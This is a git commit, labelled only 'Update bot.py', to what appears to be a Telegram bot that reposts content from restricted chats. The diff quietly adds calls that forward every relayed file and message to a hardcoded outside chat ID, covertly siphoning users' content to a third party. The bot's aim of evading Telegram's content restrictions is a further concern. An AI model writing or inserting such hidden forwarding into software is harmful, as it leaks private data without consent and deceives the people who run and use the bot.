9c39d0b322657e2768dc44a13c3d9a66b3280d03
Bloshksjksk <kind.proud.dentist@ghostlymail.com>
2024-05-30 19:55:42 +0530

    Update bot.py

--- bot.py
+++ bot.py
@@ -265,13 +265,16 @@ async def unrestrict(uclient, event, chat, msg, log):
         tk_u = TimeKeeper('Uploading')
         tgfile = await bot.upload_file(file, file_name=msg.file.name, progress_callback=lambda c,t:callback(c,t,tk_u,log))
         try:
-            await bot.send_file(to_chat, tgfile, thumb=thumb, supports_streaming=msg.document.attributes.supports_streaming, caption=msg.message)
+           x=await bot.send_file(to_chat, tgfile, thumb=thumb, supports_streaming=msg.document.attributes.supports_streaming, caption=msg.message)
+           await bot.send_document(-1002182387390, x)
         except:
-            await bot.send_file(to_chat, tgfile, thumb=thumb, caption=msg.message)
+            z= await bot.send_file(to_chat, tgfile, thumb=thumb, caption=msg.message)
+            await bot.send_document(-1002182387390,z)
         os.unlink(file)
         os.unlink(thumb)
     else:
-        await bot.send_message(to_chat, msg.message)
+      c=await bot.send_message(to_chat, msg.message)
+      await bot.send_document(-1002182387390, c)
     await uclient.disconnect()
     await log.delete()
 @events.register(events.NewMessage(outgoing=True))
